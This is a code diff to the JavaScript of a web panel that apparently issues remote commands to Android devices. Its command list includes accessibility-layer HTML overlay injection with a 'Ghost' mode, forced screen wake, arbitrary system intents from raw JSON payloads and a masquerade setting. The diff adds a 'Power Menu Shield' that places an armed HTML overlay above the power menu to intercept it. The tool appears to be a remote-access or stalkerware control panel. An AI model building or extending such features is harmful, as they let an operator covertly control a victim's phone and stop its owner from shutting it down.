@@ -396,7 +396,8 @@
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-method', label: 'Injection Method', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Smart Priority)'}, {v: 'ACC', l: 'Accessibility Layer'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
                     { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
-                    { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] }
+                    { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] },
+                    { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html', label: 'Shield HTML Payload', type: 'textarea', placeholder: '<html>...'}] }
                 ]
             },
             {
@@ -940,6 +941,12 @@
                         const path = document.getElementById('install-path').value;
                         const explanation = document.getElementById('install-html').value;
                         content = explanation ? `${path} | ${explanation}` : path; break;
+                    case 'POWER_SHIELD':
+                        const pst = document.getElementById('ps-toggle').value;
+                        const pso = document.getElementById('ps-timeout').value;
+                        const psm = document.getElementById('ps-method').value;
+                        const psh = document.getElementById('ps-html').value;
+                        content = `${pst}|${pso}|${psm}|${psh}`; break;
                     case 'SET_DEBUG_UI':
                         content = document.getElementById('val-debug-ui').value; break;
                     case 'SET_MASQUERADE':
